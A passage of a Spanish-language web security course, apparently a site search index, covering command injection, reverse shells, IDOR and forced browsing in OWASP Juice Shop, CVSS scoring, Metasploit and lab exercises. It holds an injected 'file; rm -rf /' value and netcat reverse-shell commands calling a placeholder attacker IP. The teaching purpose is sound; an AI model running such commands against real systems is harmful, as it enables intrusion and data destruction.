como:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$filename = $_POST['filename'];\n$content = $_POST['content'];\nsystem(\u0026quot;echo '$content' \u0026gt; $filename\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEsto puede ser muy fácilmente escapado y explotado con el caracter \u003ccode\u003e;\u003c/code\u003e en el nombre del archivo. Por ejemplo,\nsi definimos el nombre del archivo como \u003ccode\u003efile; rm -rf /\u003c/code\u003e, el servidor estaría almacenando el contenido enviado\nen el archivo \u003ccode\u003efile\u003c/code\u003e, para luego terminar ese comando y eliminar todo dentro del directorio \u003ccode\u003e/\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOtro ejemplo es un servidor al cual se puede subir archivos y luego visualizarlos. Existen muchos archivos,\nllamados \u003cem\u003ewebshells\u003c/em\u003e, los cuales están hechos con este propósito. Varían dependiendo del lenguaje utilizado\nen el servidor, y solo funcionan para lenguajes ejecutados en el lado del servidor.\n\u003ca href=\"https://github.com/tennc/webshell\"\u003eAquí\u003c/a\u003e pueden encontrar un repositorio con webshells para\nmuchos lenguajes diferentes.\u003c/p\u003e\n"},{id:19,href:"/docs/apps-web/reverse-shell/",title:"Reverse Shell",description:null,content:"\u003cp\u003eEn el capítulo anterior vimos cómo ejecutar comandos de manera remota en un servidor, sin tener acceso a una\nterminal. Esto es muy útil en un comienzo, pero rápidamente se vuelve evidente la lentitud, torpeza y limitaciones\nque significa este medio. Sería mucho más cómodo si de alguna forma se pudiese obtener acceso a una terminal,\no \u003cem\u003eshell\u003c/em\u003e, con la cual ejecutar comandos de manera más directa, y sin tener que pasar por todo el proceso\nremoto.\u003c/p\u003e\n\u003cp\u003eAfortunadamente existen las shell reversas: a diferencia de una shell normal, en la cual el cliente se conecta\na un servidor escuchando por conexiones, una shell reversa implica que el cliente está a la espera de una\nconexión, y es el servidor quien la inicia. Asumiendo que ya tienen RCE, es posible iniciar una reverse shell con\nun par de comandos, aunque puede ser necesario evadir algún filtro, firewall o antivirus.\u003c/p\u003e\n\u003cp\u003eLos pasos para levantar una reverse shell son los siguientes:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eEl atacante espera por conexiones TCP en algún puerto específico (por ejemplo 4444).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eEl servidor inicia una conexión TCP con el atacante en el puerto especificado.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUna vez establecida la conexión, el servidor levanta una shell\n(como \u003ccode\u003esh\u003c/code\u003e o \u003ccode\u003ebash\u003c/code\u003e en Linux, y \u003ccode\u003ecmd.exe\u003c/code\u003e o \u003ccode\u003epowershell.exe\u003c/code\u003e en Windows).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTodos los mensajes del atacante son redirigidos a la entrada estándar de la shell, y la salida estándar de\nesta es redirigida por la conexión hacia el atacante.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"herramientas\"\u003eHerramientas\u003c/h2\u003e\n\u003cp\u003eEn términos generales, cualquier programa que permita escuchar e iniciar comunicaciones TCP, y luego redirigir\nlas entradas y salidas estándar, debería funcionar. Los más comunes son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLinux: \u003ccode\u003enc\u003c/code\u003e, \u003ccode\u003encat\u003c/code\u003e, \u003ccode\u003enetcat\u003c/code\u003e, \u003ccode\u003esocat\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWindows: \u003ccode\u003enc.exe\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTambién se puede iniciar reverse shells con casi todos los lenguajes de programación.\n\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\"\u003eAquí\u003c/a\u003e\npueden encontrar documentación sobre muchas técnicas distintas de iniciar reverse shells.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003ch3 id=\"cliente\"\u003eCliente\u003c/h3\u003e\n\u003cp\u003ePara empezar a escuchar en el puerto \u003ccode\u003e4444\u003c/code\u003e por conexiones TCP, puede usar \u003ccode\u003enc\u003c/code\u003e de la siguiente forma:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003enc -lvp 4444\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTambién pueden usar \u003ca href=\"https://github.com/calebstewart/pwncat\"\u003epwncat\u003c/a\u003e, que está hecho para reverse shells,\ny tiene más características, como autocompletado con TAB.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003epwncat --listen --port 4444\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"servidor\"\u003eServidor\u003c/h3\u003e\n\u003cp\u003eEn el servidor usualmente no se tiene control de los programas instalados, por lo que se tendrán que adaptar\na lo que encuentren ahí. De todas formas, casi siempre está instalado \u003ccode\u003enc\u003c/code\u003e o \u003ccode\u003enc.exe\u003c/code\u003e. Para iniciar la conexión\na la IP \u003ccode\u003e1.2.3.4\u003c/code\u003e y puerto \u003ccode\u003e4444\u003c/code\u003e, levantar la shell y redirigir la entrada y salida estándar, se ejecuta lo siguiente:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003enc -c /bin/bash 1.2.3.4 4444\nnc.exe 1.2.3.4 4444 -e cmd.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"prueba-de-concepto\"\u003ePrueba de Concepto\u003c/h3\u003e\n\u003cp\u003eEjecutamos lo descrito anteriormente, con una misma máquina funcionando como cliente y servidor. En el lado\ndel servidor no se ve nada muy interesante:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../reverse-shell-server.png\" alt=\"Reverse Shell Server\"\u003e\u003c/p\u003e\n\u003cp\u003ePero el cliente ahora tiene una shell nueva:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../reverse-shell-client.png\" alt=\"Reverse Shell Client\"\u003e\u003c/p\u003e\n"},{id:20,href:"/docs/apps-web/access-control/",title:"Broken Access Control",description:null,content:"\u003cp\u003eEl control de acceso es una política aplicada a los usuarios,\nde manera que no puedan actuar fuera de sus permisos asignados.\nLas fallas en estas políticas suelen conllevar a la pérdida de\nconfidencialidad, modificación o destrucción de recursos, o la\nejecución de procesos no autorizados.\u003c/p\u003e\n\u003cp\u003eA continuación veremos algunos ejemplos de pérdida de control de acceso,\nsin embargo, esta clase de vulnerabilidades no se limita únicamente\na estos.\u003c/p\u003e\n\u003ch2 id=\"principio-del-privilegio-mínimo\"\u003ePrincipio del Privilegio Mínimo\u003c/h2\u003e\n\u003cp\u003eEl principio del privilegio mínimo (PoLP: Principle of least privilege)\nse refiere a la práctica de asignar los permisos estrictamente necesarios\npara el funcionamiento del sistema, y nada más. Aplica a usuarios, procesos,\narchivos, y cualquier otro tipo de entidad a la cual se le pueda restringir\nsu capacidad de acción mediante permisos o privilegios.\u003c/p\u003e\n\u003cp\u003eUn sistema que no siga el PoLP abre la posibilidad a accesos no permitidos,\nlo que podría resultar en robo, alteración o destrucción de información,\nmovimientos laterales o escalación de privilegios. En términos más concretos,\nse está permitiendo el acceso a recursos que no se debería tener acceso.\u003c/p\u003e\n\u003cp\u003eMuchas veces los desarrolladores piensan que implementando medidas de control\nde acceso en el frontend, están evitando este tipo de situaciones: \u0026ldquo;Si el botón\nno aparece en las opciones, el usuario no puede realizar esta acción\u0026rdquo;. Esto, sin\nembargo, no es correcto. Un atacante puede forzar el envío de ciertas peticiones\nHTTP y gatillar estas funcionalidades restringidas, evadiendo el intento de\ncontrol de acceso.\u003c/p\u003e\n\u003ch2 id=\"insecure-direct-object-reference\"\u003eInsecure Direct Object Reference\u003c/h2\u003e\n\u003cp\u003eLa vulnerabilidad conocida como Insecure Direct Object Reference (IDOR)\nes un caso particular de la ausencia de control de acceso, y ocurre\nen situaciones donde se acceda a un objeto por medio de un identificador\núnico. Esto es muy prevalente en APIs, pero también ocurre en otras instancias.\u003c/p\u003e\n\u003cp\u003eUn ejemplo de esto es obtener el perfil de otro usuario. Supongamos que\npara ver nuestro perfil, se envía una petición GET hacia \u003ccode\u003e/profile?id=5325\u003c/code\u003e.\nAhora, si los controles de acceso no están bien implementados, podríamos\nobtener el perfil de otro usuario si modificamos la URL \u003ccode\u003e/profile?id=1234\u003c/code\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTIP:\nCasi siempre el primer usuario creado en cualquier sistema es el usuario\nadministrador. Esto significa que al buscar \u003ccode\u003e/profile?id=0\u003c/code\u003e estamos\npotencialmente obteniendo el perfil del administrador.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eVeamos cómo podemos aplicar esto en el \u003ca href=\"https://owasp.org/www-project-juice-shop/\"\u003eJuice Shop\u003c/a\u003e\nde OWASP. Para este caso, el IDOR existe en la funcionalidad\ndel carrito de compras. Primero debemos crear una cuenta e iniciar sesión:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../juiceshop-login.png\" alt=\"Juice Shop Login\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego agregamos algún producto cualquiera al carrito:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../juiceshop-add-to-cart.png\" alt=\"Juice Shop Add to cart\"\u003e\u003c/p\u003e\n\u003cp\u003eEsto gatilla una petición para obtener el contenido de nuestro carrito:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../juiceshop-my-basket.png\" alt=\"Juice Shop My basket\"\u003e\u003c/p\u003e\n\u003cp\u003eSi modificamos el identificador en la URL, podemos obtener el carrito de otro usuario:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../juiceshop-idor.png\" alt=\"Juice Shop IDOR\"\u003e\u003c/p\u003e\n\u003ch2 id=\"forced-browsing\"\u003eForced Browsing\u003c/h2\u003e\n\u003cp\u003eLa vulnerabilidad de Forced Browsing es similar a la falla en el\nPrincipio del Privilegio Mínimo. En este caso, se permite a los usuairos\nnavegar a vistas restringidas, cambiando la URL en la que se encuentran.\u003c/p\u003e\n\u003cp\u003ePor ejemplo, si podemos acceder al panel de administración simplemente\naccediendo a la URL \u003ccode\u003e/admin\u003c/code\u003e, estamos en presencia de un Forced Browsing.\nPara esto, muchas veces se requiere tener algún tipo de sesión activa,\nsin importar los privilegios del usuario.\u003c/p\u003e\n\u003cp\u003eOtro ejemplo de esto podría ser si tenemos acceso únicamente a un\nlistado de usuarios en \u003ccode\u003e/list-users\u003c/code\u003e, y lo modificamos a\n\u003ccode\u003e/edit-users\u003c/code\u003e. Luego, tendríamos la capacidad de editar usuarios.\u003c/p\u003e\n\u003cp\u003ePara encontrar este tipo de vulnerabilidades se puede buscar referencias\na las URLs restringidas en los archivos JavaScript del sitio web,\no enumerar directorios y archivos con alguna herramienta.\nLa enumeración debe ser realizada utilizando una sesión de usuario\nde ser posible.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003edirsearch -u \u003cspan class=\"s1\"\u003e\u0026#39;http://localhost/\u0026#39;\u003c/span\u003e --cookie \u003cspan class=\"s1\"\u003e\u0026#39;SESSION=cookie\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eProbando esto en Juice Shop obtenemos lo siguiente:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003edirsearch -u http://localhost:3000/ --cookie \u003cspan class=\"s1\"\u003e\u0026#39;language=en; welcomebanner_status=dismiss; continueCode=MN53Kp8wVOl4WEgvQBKz1DoX7e2x0eBPAYbr9yjp3qPm6MZLnak5NJRRy6zv; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNj\n\u003c/span\u003e\u003cspan class=\"s1\"\u003eZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsInBhc3N3b3JkIjoiYWUyYjFmY2E1MTU5NDllNWQ1NGZiMjJiOGVkOTU1NzUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZml\n\u003c/span\u003e\u003cspan class=\"s1\"\u003esZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDQtMDcgMTU6MTY6NDEuNjU3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDQtMDcgMTU6Mjg6NTUuNTI2ICswMDowMC\n\u003c/span\u003e\u003cspan class=\"s1\"\u003eIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcxMjUwMzg0MH0.EMSR5vZI983opfLuRmaAEfaJ3riPnEUJfCbz0tKM2nvPu3piD_ggpw0LKKdiU251Db1FqtubhBEkDWvaoMnYtuGF1TO-UdssJEHyJFAdpuO-QimIt7-0qg3mF09SAUfMMSpOsN1czSJm3dehH6bZiRFEUsYufxnrmM4JoWYMGHU\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"../juiceshop-dirsearch.png\" alt=\"Juice Shop dirsearch\"\u003e\u003c/p\u003e\n\u003cp\u003eIngresamos a \u003ccode\u003ehttp://localhost:3000/ftp\u003c/code\u003e y encontramos el siguiente contenido:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../juiceshop-ftp.png\" alt=\"Juice Shop FTP\"\u003e\u003c/p\u003e\n"},{id:21,href:"/docs/apps-web/cve/",title:"Common Vulnerabilities and Exposures",description:null,content:"\u003cp\u003eMuchas veces ustedes se encontrarán con sistemas (web u otro tipo) que utilizan software con vulnerabilidades\nconocidas (punto 6 del OWASP Top 10). Estas vulnerabilidades se catalogan como \u003cem\u003eCommon Vulnerabilities and\nExposures\u003c/em\u003e (CVE), el cual es un sistema que intenta proveer información y documentación sobre\nvulnerabilidades conocidas públicamente. Esto se suele documentar junto a su puntaje\n\u003ca href=\"https://www.first.org/cvss/v3.1/specification-document\"\u003eCVSS\u003c/a\u003e (\u003cem\u003eCommon Vulnerabilities Scoring System\u003c/em\u003e).\u003c/p\u003e\n\u003ch2 id=\"cvss\"\u003eCVSS\u003c/h2\u003e\n\u003cp\u003eEs un sistema abierto para comunicar las características y severidad de vulnerabilidades conocidas en software.\nProduce un puntaje de 0 a 10 indicando la explotabilidad de la vulnerabilidad en cuestión.\nEstos puntajes se categorizan de la siguiente manera:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInformative\u003c/strong\u003e (0.0): La vulnerabilidad no es explotable pero puede entregar información o recursos que\npermiten o facilitan la explotación de otra vulnerabilidad. Ejemplo: revelar rutas absolutas de archivos\nen el servidor.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eLow\u003c/strong\u003e (0.1 - 3.9): La vulnerabilidad es muy difícil de explotar, o los recursos ganados luego de explotarla\nno son muy relevantes. Ejemplo: divulgación o enumeración de usuarios del sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMedium\u003c/strong\u003e (4.0 - 6.9): No se requiere tanto esfuerzo para explotar la vulnerabilidad, pero los componentes\ncomprometidos no son críticos. Ejemplo: poder interceptar información no sensible ni privada de otros usuarios.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eHigh\u003c/strong\u003e (7.0 - 8.9): Se puede comprometer un ámbito completo del sistema (confidencialidad, integridad\no disponibilidad). Ejemplo: poder leer toda la información de todos los usuarios.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCritical\u003c/strong\u003e (9.0 - 10): Se compromete el sistema completo, permitiéndole al atacante leer y modificar\ntoda la información y componentes o denegar el servicio. Ejemplo: obtener acceso a la cuenta de administrador\ndel sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEste puntaje se calcula de manera pseudo objetiva, teniendo en cuenta métricas base, temporales y\nambientales.\u003c/p\u003e\n\u003ch3 id=\"métricas-base\"\u003eMétricas Base\u003c/h3\u003e\n\u003cp\u003eLas métricas base intentan describir a la vulnerabilidad de manera aislada y teórica,\nutilizando los siguientes datos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Vector\u003c/strong\u003e (Network, Adjacent, Local, Physical).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Complexity\u003c/strong\u003e (Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePrivileges Required\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUser Interaction\u003c/strong\u003e (None, Required).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eScope\u003c/strong\u003e (Unchanged, Changed).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfidentiality\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntegrity\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAvailability\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"métricas-temporales\"\u003eMétricas Temporales\u003c/h3\u003e\n\u003cp\u003eLas métricas temporales incluyen factores sobre el estado de los exploits para la vulnerabilidad en cuestión\nen la actualidad, los que varían en el tiempo:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExploit Code Maturity\u003c/strong\u003e (Not defined, Unproven that exploit exists, Proof of concept code,\nFunctional exploit exists, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRemediation Level\u003c/strong\u003e (Not Defined, Official fix, Temporary fix, Workaround, Unavailable).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReport Confidence\u003c/strong\u003e (Not Defined, Unknown, Reasonable, Confirmed).\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"métricas-ambientales\"\u003eMétricas Ambientales\u003c/h3\u003e\n\u003cp\u003eFinalmente, las métricas de tipo ambientales son específicas para los dueños del sistema afectado, e intentan\ncuantificar la importancia de la vulnerabilidad en el entorno en el cual se encuentra.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Vector\u003c/strong\u003e (Not Defined, Network, Adjacent Network, Local, Physical).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Complexity\u003c/strong\u003e (Not Defined, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePrivileges Required\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUser Interaction\u003c/strong\u003e (Not Defined, None, Required).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eScope\u003c/strong\u003e (Not Defined, Unchanged, Changed).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfidentiality\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntegrity\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAvailability\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfidentiality Requirement\u003c/strong\u003e (Not Defined, Low, Medium, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntegrity Requirement\u003c/strong\u003e (Not Defined, Low, Medium, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAvailability Requirement\u003c/strong\u003e (Not Defined, Low, Medium, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"herramientas\"\u003eHerramientas\u003c/h2\u003e\n\u003cp\u003eLa herramienta más conocida y utilizada para la explotación de CVEs es \u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e,\nel cual es un repositorio de vulnerabilidades parametrizadas, para facilitar su explotación.\nAdemás está \u003ca href=\"https://www.exploit-db.com/searchsploit\"\u003esearchsploit\u003c/a\u003e, que es un repositorio con descripciones\ny pruebas de concepto para algunos CVE que no aparecen en Metasploit.\u003c/p\u003e\n\u003cp\u003eSin embargo no todos los CVEs están en esas herramientas, y tendrán que buscarlos en internet.\nAlgunos sitios útiles son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/\"\u003ehttps://www.exploit-db.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://vuldb.com/\"\u003ehttps://vuldb.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cvedetails.com/vulnerability-list/vendor_id-16542/Laravel.html\"\u003ehttps://www.cvedetails.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/\"\u003ehttps://medium.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/\"\u003ehttps://github.com/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn estos podrán encontrar códigos, pruebas de concepto, y guías paso a paso sobre cómo funcionan algunas\nvulnerabilidades.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003ePara iniciar Metasploit deben correr el siguiente comando como \u003ccode\u003eroot\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003emsfdb run\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLuego pueden buscar dentro del repositorio de vulnerabilidades por palabras clave \u003ccode\u003esearch \u0026lt;keyword\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../metasploit-search.png\" alt=\"Metasploit Search\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, para elegir un exploit, pueden ejecutar \u003ccode\u003euse \u0026lt;num\u0026gt;\u003c/code\u003e con el número del exploit en la lista retornada\nde la búsqueda.\u003c/p\u003e\n\u003cp\u003eRecuerden que \u003cstrong\u003elas vulnerabilidades varían entre versiones de cada software\u003c/strong\u003e, por lo que no necesariamente\npodrán explotarlas siempre.\u003c/p\u003e\n\u003cp\u003ePueden encontrar un tutorial bastante completo de Metasploit\n\u003ca href=\"https://www.tutorialspoint.com/metasploit/index.htm\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003ePara buscar exploits en searchsploit, simplemente usar el comando \u003ccode\u003esearchsploit \u0026lt;keyword\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../searchsploit-searching.png\" alt=\"Searchsploit Searching\"\u003e\u003c/p\u003e\n\u003cp\u003eEsto les retornará una lista de exploits con un nombre y una ruta al archivo con la descripción o prueba de concepto.\nSi el archivo es \u003ccode\u003e.rb\u003c/code\u003e significa que existe un módulo de Metasploit implementado. Sino, tendrán que leer la\ndescripción e llevar a cabo la explotación de manera manual.\u003c/p\u003e\n\u003cp\u003eLos archivos están nombrados con un código numérico que los identifica. Si quieren ver el archivo,\npueden imprimir la ruta completa a este usando \u003ccode\u003esearchsploit -p \u0026lt;code\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../searchsploit-path.png\" alt=\"Searchsploit Path\"\u003e\u003c/p\u003e\n"},{id:22,href:"/docs/apps-web/ejercicios/",title:"Ejercicios Apps Web",description:null,content:"\u003ch2 id=\"web-i\"\u003eWeb I\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCrearse una cuenta en \u003ca href=\"https://www.hackthebox.eu/\"\u003eHack The Box\u003c/a\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eHacer el challenge \u003ccode\u003eCanvas\u003c/code\u003e de la categoría \u003ccode\u003eMisc\u003c/code\u003e en \u003ca href=\"https://www.hackthebox.eu/home/challenges/Misc\"\u003eHTB\u003c/a\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los labs de \u003ca href=\"https://portswigger.net/web-security/information-disclosure\"\u003eInformation disclosure\u003c/a\u003e\nde PortSwigger. Necesitarán una cuenta para ver los labs de PortSwigger.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"web-ii\"\u003eWeb II\u003c/h2\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003e\n\u003cp\u003eCompletar el \u003ca href=\"https://xss-game.appspot.com/\"\u003eXSS Game\u003c/a\u003e hecho por Google. En este verán distintos tipos de\nXSS y tendrán que evadir filtros.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los laboratorios de \u003ca href=\"https://portswigger.net/web-security/cross-site-scripting\"\u003eCross-Site Scripting\u003c/a\u003e\nde PortSwigger.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los laboratorios de \u003ca href=\"https://portswigger.net/web-security/sql-injection\"\u003eSQL injection\u003c/a\u003e\nde PortSwigger. Resolver primero de manera manual y luego usando sqlmap.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los laboratorios de \u003ca href=\"https://portswigger.net/web-security/os-command-injection\"\u003eOS Command Injection\u003c/a\u003e\nde PortSwigger.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"web-iii\"\u003eWeb III\u003c/h2\u003e\n\u003col start=\"8\"\u003e\n\u003cli\u003eEn \u003ca href=\"https://github.com/digininja/DVWA\"\u003eDamn Vulnerable Web Application\u003c/a\u003e aprovecharse del RCE en\nlas secciones de \u003ccode\u003eCommand Injection\u003c/code\u003e y \u003ccode\u003eFile Upload\u003c/code\u003e para obtener una shell reversa.\u003c/li\u003e\n\u003c/ol\u003e\n"},{id:23,href:"/docs/forense/",title:"Análisis Forense",description:null,content:""},{id:24,href:"/docs/forense/intro/",title:"Introducción al Análisis Forense",description:null,content:"\u003cp\u003eEl término \u0026ldquo;Análisis Forense\u0026rdquo; corresponde en grandes rasgos al trabajo de recolectar y analizar evidencia científica para el uso en una investigación criminal. El área de la ciberseguridad emplea este término para definir el conjunto de técnicas computacionales que permiten obtener información importante sobre dispositivos a partir del análisis de registros presentes en los sistemas analizados.\u003c/p\u003e\n\u003cp\u003eEn términos concretos, algunas actividades relacionadas con el análisis forense computacional pueden ser:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRevisión de \u003cem\u003elogs\u003c/em\u003e de programas o sistemas computacionales para determinar acciones realizadas o archivos exifiltrados luego de una intrusión a un sistema.\u003c/li\u003e\n\u003cli\u003eRecuperación de archivos e información desde memoria RAM o almacenamiento secundario en máquinas reales o virtuales, ya sea a partir de archivos temporales, sistemas de versionamiento o de datos presentes de forma física en el dispositivo debido a una mala eliminación.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn el caso de competencias de tipo \u003cem\u003eCapture the Flag\u003c/em\u003e, los desafíos de categoría forense utilizan técnicas inspiradas en el análisis forense computacional, siendo las \u003cem\u003eflag\u003c/em\u003e la información escondida en un archivo, comunicación o dispositivo.\u003c/p\u003e\n\u003cp\u003eEn esta unidad del curso veremos algunos casos específicos de problemas de análisis forense. La idea es que puedan desarrollar la intuición inicial para adentrarse por su cuenta a problemas más complejos o relacionados con programas y dispositivos distintos a los vistos en el curso. En específico, veremos las siguientes categorías:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eComandos de consola en Linux útiles para análisis forense\u003c/strong\u003e: Esta sección enumerará algunos comandos de consola que les pueden ser útiles para CTFs con preguntas de análisis forense.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAnálisis forense sobre Logs de sistemas y programas\u003c/strong\u003e: En esta sección se mostrarán las 